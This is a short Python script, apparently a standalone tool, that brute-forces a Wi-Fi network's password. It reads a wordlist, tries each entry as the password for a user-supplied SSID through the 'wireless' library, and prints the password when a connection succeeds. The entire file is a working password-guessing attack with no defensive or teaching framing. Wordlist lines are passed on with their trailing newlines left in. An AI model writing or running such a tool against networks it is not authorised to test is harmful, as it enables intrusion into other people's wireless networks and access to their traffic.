import sys
from wireless import Wireless

def main(SSID=None, Wordlist=None):
    try:
        SSID = str(SSID)
    except:
        print("Need to supply a network SSID and a password list")
        return 0

    try:
        dictionary = open(Wordlist, 'r')
    except:
        print("Wordlist supplied not found")
        return 0
    #For each password in the dictionary, check the password by attempting
    #to connect to the network with the user supplied SSID. If successful
    #(res is true) then display to screen and quit checking. 
    for network_password in dictionary:
        wireless = Wireless()
        res = wireless.connect(ssid=SSID, password=network_password)
        if(res):
            print("Success - Password for " + SSID + " is " + network_password)
            return 0
        
    print("Password not in dictionary")

if __name__ == "__main__":
    try:
        SSID = sys.argv[1]
        dictionary = sys.argv[2]
    except IndexError:
        print("Need to supply a network SSID and a password list")
        exit(0)
    main(SSID, dictionary)
    
